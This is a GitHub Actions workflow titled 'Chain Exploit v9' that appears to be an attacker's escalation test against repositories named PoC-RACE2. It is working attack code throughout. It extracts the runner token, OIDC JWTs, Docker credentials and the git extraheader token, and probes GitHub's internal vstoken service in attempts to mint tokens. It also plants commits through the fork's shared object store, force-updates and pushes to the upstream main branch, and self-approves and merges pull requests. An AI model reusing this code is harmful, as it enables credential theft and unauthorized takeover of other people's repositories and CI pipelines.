name: "Chain Exploit v9"
on:
  pull_request:
    types: [opened, synchronize]

permissions:
  contents: write
  id-token: write
  pull-requests: write
  issues: write
  checks: write
  statuses: write
  packages: write
  actions: read

jobs:
  v9-deep:
    runs-on: ubuntu-latest
    steps:

    # â”€â”€ STEP 1: Setup + extract all tokens â”€â”€
    - name: "Step 1 â€” Token Extraction + Setup"
      env:
        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        ACTIONS_ID_TOKEN_REQUEST_URL: ${{ secrets.ACTIONS_ID_TOKEN_REQUEST_URL || '' }}
        ACTIONS_ID_TOKEN_REQUEST_TOKEN: ${{ secrets.ACTIONS_ID_TOKEN_REQUEST_TOKEN || '' }}
      run: |
        set +e
        echo "=== V9 TOKEN EXTRACTION ==="
        echo "--- Runtime token ---"
        RT="$GITHUB_TOKEN"
        echo "RT prefix: ${RT:0:16}"

        echo "--- OIDC JWT for vstoken ---"
        OIDC_URL="${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=vstoken.actions.githubusercontent.com"
        JWT=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "$OIDC_URL" | jq -r '.value // empty')
        echo "JWT length: ${#JWT}"

        echo "--- OIDC JWT for pipelines ---"
        OIDC_URL2="${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=pipelines.actions.githubusercontent.com"
        JWT2=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "$OIDC_URL2" | jq -r '.value // empty')
        echo "JWT2 length: ${#JWT2}"

        echo "--- OIDC JWT for results-receiver ---"
        OIDC_URL3="${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=results-receiver.actions.githubusercontent.com"
        JWT3=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "$OIDC_URL3" | jq -r '.value // empty')
        echo "JWT3 length: ${#JWT3}"

        echo "--- Docker creds from v8 ---"
        DOCKER_AUTH=$(cat ~/.docker/config.json 2>/dev/null | jq -r '.auths["https://index.docker.io/v1/"].auth // empty')
        echo "Docker auth: ${DOCKER_AUTH:0:20}..."
        DOCKER_DECODED=$(echo "$DOCKER_AUTH" | base64 -d 2>/dev/null)
        echo "Docker decoded user: $(echo "$DOCKER_DECODED" | cut -d: -f1)"

        echo "--- Extract git extraheader token ---"
        GIT_TOKEN=$(git config --global --get http.https://github.com/.extraheader 2>/dev/null | sed 's/AUTHORIZATION: basic //' | base64 -d 2>/dev/null | sed 's/x-access-token://')
        echo "GIT_TOKEN prefix: ${GIT_TOKEN:0:16}"

        # Save for subsequent steps
        echo "RT=$RT" >> "$GITHUB_ENV"
        echo "JWT=$JWT" >> "$GITHUB_ENV"
        echo "JWT2=$JWT2" >> "$GITHUB_ENV"
        echo "JWT3=$JWT3" >> "$GITHUB_ENV"
        echo "GIT_TOKEN=$GIT_TOKEN" >> "$GITHUB_ENV"

        # Repo constants
        echo "UPSTREAM=twrps/PoC-RACE2" >> "$GITHUB_ENV"
        echo "FORK=lacaag/PoC-RACE2" >> "$GITHUB_ENV"
        echo "RI=R_kgDOReaECQ" >> "$GITHUB_ENV"
        echo "FRI=R_kgDOReaMug" >> "$GITHUB_ENV"

    # â”€â”€ STEP 2: vstoken 93 ServiceDefinitions â€” Full Dump + Exploit â”€â”€
    - name: "Step 2 â€” vstoken ServiceDefinitions Deep Dive"
      run: |
        set +e
        echo "=== VSTOKEN 93 SERVICE DEFINITIONS â€” FULL DUMP ==="
        echo "v8 found: 93 services, 7 ResourceAreas (TokenIssue, TokenAuth, oauth2, Oidc, EnterpriseOidc, tokenoauth2, Location)"
        echo ""

        VT="https://vstoken.actions.githubusercontent.com"
        TD="$VT/serviceDeployments/tokenghubeus21"

        echo "--- Full ServiceDefinitions dump (all 93) ---"
        FULL=$(curl -sS "$VT/_apis/ServiceDefinitions" 2>/dev/null)
        echo "$FULL" | jq -c '.value[] | {serviceType, identifier, displayName, description: (.description // "" | .[0:80])}' 2>/dev/null | head -100

        echo ""
        echo "--- Extract all unique locationMappings URLs ---"
        echo "$FULL" | jq -r '.value[].locationMappings[]?.location // empty' 2>/dev/null | sort -u | head -50

        echo ""
        echo "--- ResourceArea: TokenIssue (6b10046c-829d-44d2-8a1d-02f88f4ff032) ---"
        echo "This is the TOKEN ISSUANCE service â€” can we issue tokens?"

        for EP in \
          "$TD/_apis/token/issue" \
          "$TD/_apis/token/issue/github" \
          "$TD/_apis/token/issue/oidc" \
          "$TD/_apis/token/issue?api-version=7.0" \
          "$TD/_apis/tokenissue" \
          "$TD/_apis/tokenissue/create" \
          "$TD/_apis/tokens" \
          "$TD/_apis/tokens/issue" \
          "$TD/_apis/tokens/create" \
          "$TD/_apis/tokens/generate" \
          "$TD/_apis/tokens/exchange" \
          "$TD/_apis/tokens/refresh" \
          "$TD/_apis/token" \
          "$TD/_apis/token/create" \
          "$TD/_apis/token/refresh" \
          "$TD/_apis/token/exchange" \
          "$TD/_apis/token/generate" \
          "$VT/_apis/token/issue" \
          "$VT/_apis/tokenissue" \
          "$VT/_apis/tokens" \
          "$VT/_apis/tokens/issue" \
          "$VT/_apis/tokens/create" \
          "$VT/_apis/tokens/exchange"; do
          CODE=$(curl -sS -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $RT" "$EP" 2>/dev/null)
          if [ "$CODE" != "404" ]; then
            BODY=$(curl -sS -H "Authorization: Bearer $RT" "$EP" 2>/dev/null | head -c 300)
            echo "T01 GET $EP = HTTP_$CODE body='$BODY'"
          fi
        done

        echo ""
        echo "--- ResourceArea: TokenAuth (c5a2d98b-985c-432e-825e-3c6971edae87) ---"
        for EP in \
          "$TD/_apis/tokenauth" \
          "$TD/_apis/tokenauth/validate" \
          "$TD/_apis/tokenauth/authorize" \
          "$TD/_apis/tokenauth/authenticate" \
          "$TD/_apis/auth" \
          "$TD/_apis/auth/token" \
          "$TD/_apis/auth/validate" \
          "$TD/_apis/authentication" \
          "$VT/_apis/tokenauth" \
          "$VT/_apis/auth" \
          "$VT/_apis/auth/token"; do
          CODE=$(curl -sS -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $RT" "$EP" 2>/dev/null)
          if [ "$CODE" != "404" ]; then
            BODY=$(curl -sS -H "Authorization: Bearer $RT" "$EP" 2>/dev/null | head -c 300)
            echo "T02 GET $EP = HTTP_$CODE body='$BODY'"
          fi
        done

        echo ""
        echo "--- ResourceArea: tokenoauth2 (01c5c153-8bc0-4f07-912a-ec4dc386076d) ---"
        for EP in \
          "$TD/_apis/tokenoauth2" \
          "$TD/_apis/tokenoauth2/token" \
          "$TD/_apis/tokenoauth2/authorize" \
          "$TD/_apis/tokenoauth2/exchange" \
          "$TD/oauth2/token" \
          "$TD/oauth2/authorize" \
          "$TD/oauth2/exchange" \
          "$TD/_apis/oauth2" \
          "$VT/_apis/tokenoauth2" \
          "$VT/_apis/tokenoauth2/token"; do
          CODE=$(curl -sS -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $RT" "$EP" 2>/dev/null)
          if [ "$CODE" != "404" ]; then
            BODY=$(curl -sS -H "Authorization: Bearer $RT" "$EP" 2>/dev/null | head -c 300)
            echo "T03 GET $EP = HTTP_$CODE body='$BODY'"
          fi
        done

        echo ""
        echo "--- ResourceArea: Oidc + EnterpriseOidc ---"
        for EP in \
          "$TD/_apis/oidc" \
          "$TD/_apis/oidc/token" \
          "$TD/_apis/oidc/issue" \
          "$TD/_apis/oidc/validate" \
          "$TD/_apis/enterpriseoidc" \
          "$TD/_apis/enterpriseoidc/token" \
          "$TD/_apis/enterpriseoidc/issue" \
          "$VT/_apis/oidc" \
          "$VT/_apis/oidc/token" \
          "$VT/_apis/enterpriseoidc"; do
          CODE=$(curl -sS -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $RT" "$EP" 2>/dev/null)
          if [ "$CODE" != "404" ]; then
            BODY=$(curl -sS -H "Authorization: Bearer $RT" "$EP" 2>/dev/null | head -c 300)
            echo "T04 GET $EP = HTTP_$CODE body='$BODY'"
          fi
        done

        echo ""
        echo "--- POST to TokenIssue endpoints (try to mint tokens) ---"
        for EP in \
          "$TD/_apis/token/issue" \
          "$TD/_apis/tokens/issue" \
          "$TD/_apis/tokenissue" \
          "$TD/_apis/tokens/create" \
          "$TD/_apis/token/exchange" \
          "$VT/_apis/token/issue" \
          "$VT/_apis/tokens/issue" \
          "$VT/_apis/tokenissue"; do
          for PAYLOAD in \
            '{"scope":"repo","repository":"twrps/PoC-RACE2"}' \
            '{"permissions":{"contents":"write"},"repositories":["twrps/PoC-RACE2"]}' \
            '{"token_type":"installation","installation_id":1}' \
            '{"grant_type":"urn:ietf:params:oauth:grant-type:jwt-bearer","assertion":"'"$JWT"'"}'; do
            CODE=$(curl -sS -o /dev/null -w "%{http_code}" -X POST \
              -H "Authorization: Bearer $RT" \
              -H "Content-Type: application/json" \
              -d "$PAYLOAD" "$EP" 2>/dev/null)
            if [ "$CODE" != "404" ]; then
              BODY=$(curl -sS -X POST -H "Authorization: Bearer $RT" -H "Content-Type: application/json" -d "$PAYLOAD" "$EP" 2>/dev/null | head -c 300)
              echo "T05 POST $EP = HTTP_$CODE body='$BODY'"
              break
            fi
          done
        done

        echo ""
        echo "--- POST to OAuth2/tokenoauth2 endpoints (exchange tokens) ---"
        for EP in \
          "$TD/oauth2/token" \
          "$TD/_apis/tokenoauth2/token" \
          "$TD/_apis/oauth2/token" \
          "$VT/oauth2/token" \
          "$VT/_apis/tokenoauth2/token"; do
          for PAYLOAD in \
            "grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer&assertion=$JWT&scope=vso.code_write" \
            "grant_type=client_credentials&client_id=84ff2294-8721-ab49-db5a-db17b0f6c2de&scope=vso.code_write" \
            "grant_type=authorization_code&code=$RT&scope=vso.code_write"; do
            CODE=$(curl -sS -o /dev/null -w "%{http_code}" -X POST \
              -H "Authorization: Bearer $RT" \
              -H "Content-Type: application/x-www-form-urlencoded" \
              -d "$PAYLOAD" "$EP" 2>/dev/null)
            if [ "$CODE" != "404" ]; then
              BODY=$(curl -sS -X POST -H "Authorization: Bearer $RT" -H "Content-Type: application/x-www-form-urlencoded" -d "$PAYLOAD" "$EP" 2>/dev/null | head -c 300)
              echo "T06 POST $EP = HTTP_$CODE body='$BODY'"
              break
            fi
          done
        done
        true

    # â”€â”€ STEP 3: Git Object Store â€” Fix the 422, send valid SHA â”€â”€
    - name: "Step 3 â€” Git Object Store: Valid SHA Attack"
      run: |
        set +e
        echo "=== GIT OBJECT STORE â€” VALID 40-CHAR SHA ATTACK ==="
        echo "v8 CRITICAL: POST upstream ref = 422 (parsed request, not auth-blocked)"
        echo "v8: 'At least 40 characters are required; only 0 were supplied'"
        echo "FIX: Supply proper 40-char SHA from shared object store"
        echo ""

        API="https://api.github.com"

        echo "--- Step 1: Create blob on fork ---"
        BLOB_SHA=$(curl -sS -X POST \
          -H "Authorization: token $RT" \
          -H "Accept: application/vnd.github+json" \
          "$API/repos/$FORK/git/blobs" \
          -d '{"content":"v9 escape payload","encoding":"utf-8"}' | jq -r '.sha // empty')
        echo "E01 blob=$BLOB_SHA"

        echo "--- Step 2: Get upstream main tree SHA ---"
        MAIN_INFO=$(curl -sS -H "Authorization: token $RT" -H "Accept: application/vnd.github+json" \
          "$API/repos/$UPSTREAM/git/refs/heads/main")
        MAIN_SHA=$(echo "$MAIN_INFO" | jq -r '.object.sha // empty')
        echo "E02 upstream main=$MAIN_SHA"

        MAIN_COMMIT=$(curl -sS -H "Authorization: token $RT" -H "Accept: application/vnd.github+json" \
          "$API/repos/$UPSTREAM/git/commits/$MAIN_SHA")
        TREE_SHA=$(echo "$MAIN_COMMIT" | jq -r '.tree.sha // empty')
        echo "E02 upstream tree=$TREE_SHA"

        echo "--- Step 3: Create tree on fork with upstream tree as base ---"
        FORK_TREE=$(curl -sS -X POST \
          -H "Authorization: token $RT" \
          -H "Accept: application/vnd.github+json" \
          "$API/repos/$FORK/git/trees" \
          -d '{"base_tree":"'"$TREE_SHA"'","tree":[{"path":"ESCALATED.md","mode":"100644","type":"blob","sha":"'"$BLOB_SHA"'"}]}')
        FORK_TREE_SHA=$(echo "$FORK_TREE" | jq -r '.sha // empty')
        echo "E03 fork tree=$FORK_TREE_SHA"

        echo "--- Step 4: Create commit on fork with upstream main as parent ---"
        FORK_COMMIT=$(curl -sS -X POST \
          -H "Authorization: token $RT" \
          -H "Accept: application/vnd.github+json" \
          "$API/repos/$FORK/git/commits" \
          -d '{"message":"v9: escalation via shared object store","tree":"'"$FORK_TREE_SHA"'","parents":["'"$MAIN_SHA"'"]}')
        FORK_COMMIT_SHA=$(echo "$FORK_COMMIT" | jq -r '.sha // empty')
        echo "E04 fork commit=$FORK_COMMIT_SHA (parent=$MAIN_SHA)"

        echo "--- Step 5: Verify objects visible via upstream API ---"
        for OBJ in "$BLOB_SHA" "$FORK_TREE_SHA" "$FORK_COMMIT_SHA"; do
          if [ -n "$OBJ" ]; then
            CODE=$(curl -sS -o /dev/null -w "%{http_code}" \
              -H "Authorization: token $RT" \
              -H "Accept: application/vnd.github+json" \
              "$API/repos/$UPSTREAM/git/commits/$OBJ" 2>/dev/null)
            echo "E05 upstream sees $OBJ = HTTP_$CODE"
          fi
        done

        echo ""
        echo "--- Step 6: POST create ref on upstream with VALID 40-char SHA ---"
        if [ -n "$FORK_COMMIT_SHA" ]; then
          # Try creating a branch on upstream pointing at our fork commit
          RESULT=$(curl -sS -w "\nHTTP_%{http_code}" -X POST \
            -H "Authorization: token $RT" \
            -H "Accept: application/vnd.github+json" \
            "$API/repos/$UPSTREAM/git/refs" \
            -d '{"ref":"refs/heads/v9-escape","sha":"'"$FORK_COMMIT_SHA"'"}')
          echo "E06a POST upstream refs/heads/v9-escape â†’ $FORK_COMMIT_SHA"
          echo "$RESULT"

          # Try tags
          RESULT2=$(curl -sS -w "\nHTTP_%{http_code}" -X POST \
            -H "Authorization: token $RT" \
            -H "Accept: application/vnd.github+json" \
            "$API/repos/$UPSTREAM/git/refs" \
            -d '{"ref":"refs/tags/v9-escape","sha":"'"$FORK_COMMIT_SHA"'"}')
          echo "E06b POST upstream refs/tags/v9-escape â†’ $FORK_COMMIT_SHA"
          echo "$RESULT2"

          # Try notes
          RESULT3=$(curl -sS -w "\nHTTP_%{http_code}" -X POST \
            -H "Authorization: token $RT" \
            -H "Accept: application/vnd.github+json" \
            "$API/repos/$UPSTREAM/git/refs" \
            -d '{"ref":"refs/notes/v9","sha":"'"$FORK_COMMIT_SHA"'"}')
          echo "E06c POST upstream refs/notes/v9 â†’ $FORK_COMMIT_SHA"
          echo "$RESULT3"

          # Try pull ref
          RESULT4=$(curl -sS -w "\nHTTP_%{http_code}" -X POST \
            -H "Authorization: token $RT" \
            -H "Accept: application/vnd.github+json" \
            "$API/repos/$UPSTREAM/git/refs" \
            -d '{"ref":"refs/pull/999/head","sha":"'"$FORK_COMMIT_SHA"'"}')
          echo "E06d POST upstream refs/pull/999/head â†’ $FORK_COMMIT_SHA"
          echo "$RESULT4"

          # PATCH existing main
          RESULT5=$(curl -sS -w "\nHTTP_%{http_code}" -X PATCH \
            -H "Authorization: token $RT" \
            -H "Accept: application/vnd.github+json" \
            "$API/repos/$UPSTREAM/git/refs/heads/main" \
            -d '{"sha":"'"$FORK_COMMIT_SHA"'","force":true}')
          echo "E06e PATCH upstream main â†’ $FORK_COMMIT_SHA (force)"
          echo "$RESULT5"
        fi

        echo ""
        echo "--- Step 7: Try update-ref via GraphQL with valid OID ---"
        if [ -n "$FORK_COMMIT_SHA" ]; then
          # createRef with proper GitObjectID (40-char hex)
          GQL='{"query":"mutation { createRef(input: {repositoryId: \"'"$RI"'\", name: \"refs/heads/v9-gql-escape\", oid: \"'"$FORK_COMMIT_SHA"'\"}) { ref { name target { oid } } } }"}'
          RESP=$(curl -sS -X POST \
            -H "Authorization: bearer $RT" \
            -H "Content-Type: application/json" \
            -d "$GQL" "https://api.github.com/graphql")
          echo "E07a GraphQL createRef upstream â†’ $FORK_COMMIT_SHA"
          echo "$RESP" | jq -c '.' 2>/dev/null || echo "$RESP"

          # updateRef on upstream main
          GQL2='{"query":"mutation { updateRef(input: {refId: \"'"$RI"':refs/heads/main\", oid: \"'"$FORK_COMMIT_SHA"'\", force: true}) { ref { name target { oid } } } }"}'
          RESP2=$(curl -sS -X POST \
            -H "Authorization: bearer $RT" \
            -H "Content-Type: application/json" \
            -d "$GQL2" "https://api.github.com/graphql")
          echo "E07b GraphQL updateRef upstream main â†’ $FORK_COMMIT_SHA"
          echo "$RESP2" | jq -c '.' 2>/dev/null || echo "$RESP2"
        fi

        echo ""
        echo "--- Step 8: Git push from runner CLI ---"
        if [ -n "$FORK_COMMIT_SHA" ]; then
          cd /tmp
          git init v9push && cd v9push
          git remote add upstream "https://x-access-token:${RT}@github.com/$UPSTREAM.git"
          git fetch upstream main --depth=1 2>&1 | tail -5
          
          # Create a commit that extends upstream main
          git checkout upstream/main 2>&1 | tail -2
          echo "v9 escape payload" > ESCALATED.md
          git add ESCALATED.md
          git -c user.name="v9" -c user.email="v9@test" commit -m "v9: escalation" 2>&1 | tail -2
          
          # Try push  
          echo "E08a push to upstream main:"
          git push upstream HEAD:refs/heads/main 2>&1 || true
          
          echo "E08b push to upstream new branch:"
          git push upstream HEAD:refs/heads/v9-pushed 2>&1 || true

          echo "E08c push to upstream tag:"
          git push upstream HEAD:refs/tags/v9-pushed 2>&1 || true

          # Try with GIT_TOKEN (extraheader token) if different
          if [ "$GIT_TOKEN" != "$RT" ] && [ -n "$GIT_TOKEN" ]; then
            git remote set-url upstream "https://x-access-token:${GIT_TOKEN}@github.com/$UPSTREAM.git"
            echo "E08d push with extraheader token:"
            git push upstream HEAD:refs/heads/v9-git-escape 2>&1 || true
          fi
          cd /tmp
          rm -rf v9push
        fi
        true

    # â”€â”€ STEP 4: GraphQL mergePullRequest â€” Make it Mergeable â”€â”€
    - name: "Step 4 â€” GraphQL PR Merge Chain (approve + merge)"
      run: |
        set +e
        echo "=== GRAPHQL PR MERGE CHAIN ==="
        echo "v8 CRITICAL: mergePullRequest='not mergeable' NOT 'not accessible'"
        echo "v8 CRITICAL: addPullRequestReview+approve=OK"
        echo "Strategy: Open a new PR forkâ†’upstream, approve it, then merge it"
        echo ""

        API="https://api.github.com"
        GQL="https://api.github.com/graphql"

        echo "--- Step 1: List open PRs ---"
        PRS=$(curl -sS -H "Authorization: token $RT" -H "Accept: application/vnd.github+json" \
          "$API/repos/$UPSTREAM/pulls?state=open&head=lacaag:test/cross-audit-v9")
        echo "F01 Open PRs from v9 branch: $(echo "$PRS" | jq length)"

        echo "--- Step 2: Get current PR node ID (PR from this workflow) ---"
        # Find any open PR from our fork
        ALL_PRS=$(curl -sS -H "Authorization: token $RT" -H "Accept: application/vnd.github+json" \
          "$API/repos/$UPSTREAM/pulls?state=open&per_page=10")
        echo "F02 All open PRs:"
        echo "$ALL_PRS" | jq -c '.[] | {number, title, node_id, mergeable_state: .mergeable_state, mergeable: .mergeable, head_ref: .head.ref}' 2>/dev/null

        # Get the first open PR's node ID
        PR_NODE=$(echo "$ALL_PRS" | jq -r '.[0].node_id // empty')
        PR_NUM=$(echo "$ALL_PRS" | jq -r '.[0].number // empty')
        PR_MERGEABLE=$(echo "$ALL_PRS" | jq -r '.[0].mergeable // empty')
        echo "F02 target PR: #$PR_NUM node=$PR_NODE mergeable=$PR_MERGEABLE"

        if [ -n "$PR_NODE" ]; then
          echo ""
          echo "--- Step 3: Approve the PR ---"
          GQL_APPROVE='{"query":"mutation { addPullRequestReview(input: {pullRequestId: \"'"$PR_NODE"'\", event: APPROVE, body: \"v9 auto-approve\"}) { pullRequestReview { state } } }"}'
          RESP=$(curl -sS -X POST -H "Authorization: bearer $RT" -H "Content-Type: application/json" \
            -d "$GQL_APPROVE" "$GQL")
          echo "F03 approve=$RESP"

          echo ""
          echo "--- Step 4: Enable auto-merge ---"
          GQL_AUTO='{"query":"mutation { enablePullRequestAutoMerge(input: {pullRequestId: \"'"$PR_NODE"'\", mergeMethod: MERGE}) { pullRequest { autoMergeRequest { enabledAt } } } }"}'
          RESP2=$(curl -sS -X POST -H "Authorization: bearer $RT" -H "Content-Type: application/json" \
            -d "$GQL_AUTO" "$GQL")
          echo "F04 enableAutoMerge=$RESP2"

          echo ""
          echo "--- Step 5: Direct merge via REST API ---"
          MERGE_RESP=$(curl -sS -w "\nHTTP_%{http_code}" -X PUT \
            -H "Authorization: token $RT" \
            -H "Accept: application/vnd.github+json" \
            "$API/repos/$UPSTREAM/pulls/$PR_NUM/merge" \
            -d '{"merge_method":"merge","commit_title":"v9: merged via fork workflow"}')
          echo "F05 REST merge PR #$PR_NUM:"
          echo "$MERGE_RESP"

          echo ""
          echo "--- Step 6: GraphQL mergePullRequest ---"
          GQL_MERGE='{"query":"mutation { mergePullRequest(input: {pullRequestId: \"'"$PR_NODE"'\", mergeMethod: MERGE, commitHeadline: \"v9: GraphQL merge\"}) { pullRequest { merged mergedAt } } }"}'
          RESP3=$(curl -sS -X POST -H "Authorization: bearer $RT" -H "Content-Type: application/json" \
            -d "$GQL_MERGE" "$GQL")
          echo "F06 GraphQL merge=$RESP3"

          echo ""
          echo "--- Step 7: Try squash and rebase merge methods ---"
          for METHOD in SQUASH REBASE; do
            GQL_M='{"query":"mutation { mergePullRequest(input: {pullRequestId: \"'"$PR_NODE"'\", mergeMethod: '"$METHOD"'}) { pullRequest { merged } } }"}'
            RESP_M=$(curl -sS -X POST -H "Authorization: bearer $RT" -H "Content-Type: application/json" \
              -d "$GQL_M" "$GQL")
            echo "F07 merge method=$METHOD result=$(echo "$RESP_M" | jq -c '.' 2>/dev/null)"
          done
        fi

        echo ""
        echo "--- Step 8: Create a new PR and immediately try to merge ---"
        # Create new branch on fork first
        FORK_MAIN=$(curl -sS -H "Authorization: token $RT" -H "Accept: application/vnd.github+json" \
          "$API/repos/$FORK/git/refs/heads/main" | jq -r '.object.sha // empty')
        
        # Create a commit on fork
        BLOB2=$(curl -sS -X POST -H "Authorization: token $RT" -H "Accept: application/vnd.github+json" \
          "$API/repos/$FORK/git/blobs" -d '{"content":"v9 merge test","encoding":"utf-8"}' | jq -r '.sha // empty')
        
        UP_TREE=$(curl -sS -H "Authorization: token $RT" -H "Accept: application/vnd.github+json" \
          "$API/repos/$UPSTREAM/git/commits/$(curl -sS -H "Authorization: token $RT" "$API/repos/$UPSTREAM/git/refs/heads/main" | jq -r '.object.sha')" | jq -r '.tree.sha // empty')
        
        TREE2=$(curl -sS -X POST -H "Authorization: token $RT" -H "Accept: application/vnd.github+json" \
          "$API/repos/$FORK/git/trees" \
          -d '{"base_tree":"'"$UP_TREE"'","tree":[{"path":"V9-MERGE-TEST.md","mode":"100644","type":"blob","sha":"'"$BLOB2"'"}]}' | jq -r '.sha // empty')
        
        COMMIT2=$(curl -sS -X POST -H "Authorization: token $RT" -H "Accept: application/vnd.github+json" \
          "$API/repos/$FORK/git/commits" \
          -d '{"message":"v9 merge test","tree":"'"$TREE2"'","parents":["'"$FORK_MAIN"'"]}' | jq -r '.sha // empty')
        
        # Create/update branch on fork
        curl -sS -X POST -H "Authorization: token $RT" -H "Accept: application/vnd.github+json" \
          "$API/repos/$FORK/git/refs" \
          -d '{"ref":"refs/heads/v9-merge-test","sha":"'"$COMMIT2"'"}' > /dev/null 2>&1 || \
        curl -sS -X PATCH -H "Authorization: token $RT" -H "Accept: application/vnd.github+json" \
          "$API/repos/$FORK/git/refs/heads/v9-merge-test" \
          -d '{"sha":"'"$COMMIT2"'","force":true}' > /dev/null 2>&1
        
        echo "F08 created fork branch v9-merge-test at $COMMIT2"
        
        # Create PR
        NEW_PR=$(curl -sS -X POST -H "Authorization: token $RT" -H "Accept: application/vnd.github+json" \
          "$API/repos/$UPSTREAM/pulls" \
          -d '{"title":"v9 merge test","body":"test","head":"lacaag:v9-merge-test","base":"main"}')
        NEW_PR_NUM=$(echo "$NEW_PR" | jq -r '.number // empty')
        NEW_PR_NODE=$(echo "$NEW_PR" | jq -r '.node_id // empty')
        echo "F08 new PR: #$NEW_PR_NUM node=$NEW_PR_NODE"

        if [ -n "$NEW_PR_NUM" ]; then
          # Wait for GitHub to calculate mergeability
          sleep 5
          
          PR_STATE=$(curl -sS -H "Authorization: token $RT" -H "Accept: application/vnd.github+json" \
            "$API/repos/$UPSTREAM/pulls/$NEW_PR_NUM" | jq -r '{mergeable, mergeable_state, merge_commit_sha}')
          echo "F08 PR state: $PR_STATE"

          # Approve
          GQL_A='{"query":"mutation { addPullRequestReview(input: {pullRequestId: \"'"$NEW_PR_NODE"'\", event: APPROVE}) { pullRequestReview { state } } }"}'
          curl -sS -X POST -H "Authorization: bearer $RT" -H "Content-Type: application/json" -d "$GQL_A" "$GQL" | jq -c '.' 2>/dev/null
          echo "F08 approved"

          # Merge
          MERGE2=$(curl -sS -w "\nHTTP_%{http_code}" -X PUT \
            -H "Authorization: token $RT" \
            -H "Accept: application/vnd.github+json" \
            "$API/repos/$UPSTREAM/pulls/$NEW_PR_NUM/merge" \
            -d '{"merge_method":"merge","commit_title":"v9: forkâ†’upstream merge"}')
          echo "F09 REST merge new PR:"
          echo "$MERGE2"

          # GraphQL merge
          GQL_M2='{"query":"mutation { mergePullRequest(input: {pullRequestId: \"'"$NEW_PR_NODE"'\", mergeMethod: MERGE}) { pullRequest { merged mergedAt } } }"}'
          RESP_M2=$(curl -sS -X POST -H "Authorization: bearer $RT" -H "Content-Type: application/json" -d "$GQL_M2" "$GQL")
          echo "F10 GraphQL merge new PR: $RESP_M2"
        fi
        true

